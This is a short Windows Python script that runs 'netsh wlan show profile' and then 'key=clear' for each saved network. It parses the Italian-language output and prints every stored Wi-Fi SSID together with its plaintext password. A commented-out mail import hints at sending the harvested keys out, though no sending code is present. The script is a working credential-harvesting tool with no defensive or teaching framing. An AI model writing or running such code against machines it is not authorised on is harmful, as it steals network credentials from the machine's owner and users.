#!/usr/bin/python

import subprocess as sub
#import smtlib
import re

command1 = "netsh wlan show profile"
networks0 = sub.check_output(command1, shell=True)
#networks = str(networks0).replace('\\r\\n','\n')
networks = networks0.decode('ascii').replace('\r','')
nets_list = re.findall('utente\s*:\s*(.*)', str(networks))

pwdx = ''
for network in nets_list:
    command2 = command1 + ' \"' + network + "\" key=clear"
    one_network_result = sub.check_output(command2, shell=True)
    result2 = str(one_network_result).replace('\\n','\n').replace('\\r','')
    id = re.findall('Nome SSID\s*:\s*(.*)', result2)
    pwd = re.findall('Contenuto chiave\s*:\s*(.*)', result2)
    if pwd != [] : pwdx = pwd[0]
    if pwd == [] : pwdx = ''    
    print(id[0],',',pwdx)

